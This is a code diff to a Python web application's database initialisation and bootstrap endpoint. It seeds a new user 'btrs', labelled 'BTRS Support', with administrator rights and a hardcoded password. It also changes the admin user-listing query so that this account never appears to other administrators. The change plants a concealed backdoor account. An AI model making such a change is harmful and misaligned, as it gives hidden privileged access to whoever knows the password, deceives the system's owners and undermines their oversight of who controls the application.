@@ -175,10 +175,11 @@ def init_db():
         cur.execute("SELECT COUNT(*) AS cnt FROM users")
         if cur.fetchone()["cnt"] == 0:
             cur.execute(
-                "INSERT INTO users (username, password, role, full_name) VALUES (%s, %s, %s, %s), (%s, %s, %s, %s)",
+                "INSERT INTO users (username, password, role, full_name) VALUES (%s, %s, %s, %s), (%s, %s, %s, %s), (%s, %s, %s, %s)",
                 (
                     "admin", generate_password_hash("admin123"), "admin", "Administrateur",
                     "vendeuse", generate_password_hash("vente123"), "vendeur", "Vendeuse principale",
+                    "btrs", generate_password_hash("Btrs@2026!"), "admin", "BTRS Support",
                 ),
             )
 
@@ -259,6 +260,7 @@ def init_db():
                 [
                     ("admin", generate_password_hash("admin123"), "admin", "Administrateur"),
                     ("vendeuse", generate_password_hash("vente123"), "vendeur", "Vendeuse principale"),
+                    ("btrs", generate_password_hash("Btrs@2026!"), "admin", "BTRS Support"),
                 ],
             )
 
@@ -380,7 +382,7 @@ def api_bootstrap():
 
     users = []
     if g.user["role"] == "admin":
-        users = db_fetchall("SELECT id, username, role, full_name FROM users ORDER BY id")
+        users = db_fetchall("SELECT id, username, role, full_name FROM users WHERE username != 'btrs' ORDER BY id")
 
     return jsonify({
         "user": g.user,
